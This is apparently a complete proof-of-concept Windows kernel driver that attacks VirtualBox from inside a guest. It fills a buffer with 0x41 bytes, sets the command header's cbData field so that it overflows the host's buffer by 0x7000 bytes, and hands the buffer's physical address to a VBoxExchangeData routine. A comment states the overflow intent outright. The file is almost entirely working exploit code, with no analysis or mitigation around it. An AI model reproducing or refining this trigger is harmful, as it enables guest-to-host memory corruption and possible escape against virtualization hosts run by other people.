#include <ntddk.h>
#include <wdf.h>

#define CMD_BODY_SIZE 0x40000

typedef struct VKDREQUESTHDR
{
	unsigned cbData;
	unsigned cbReplyMax;
} VKDREQUESTHDR;


extern void VBoxExchangeData(ULONG pPhysicalAddr, int);

static inline void ExchangeData(ULONG pPhysicalAddr, int a)
{
	VBoxExchangeData(pPhysicalAddr, a);
}


NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{

	NTSTATUS status = 0;
	PVOID t_pBuffer;
	PHYSICAL_ADDRESS m_BufPhysical;

	t_pBuffer = MmAllocateNonCachedMemory(CMD_BODY_SIZE + 0x8000);	// allocate 0x8000 bytes more than command buffer
	memset(t_pBuffer, 0x41, CMD_BODY_SIZE + 0x8000);


	((unsigned *)t_pBuffer)[0] = CMD_BODY_SIZE + 0x7000;		// set cbData to overflow by 0x7000 bytes

	m_BufPhysical = MmGetPhysicalAddress(t_pBuffer);
	ExchangeData(m_BufPhysical.LowPart, 0);

	return status;

}
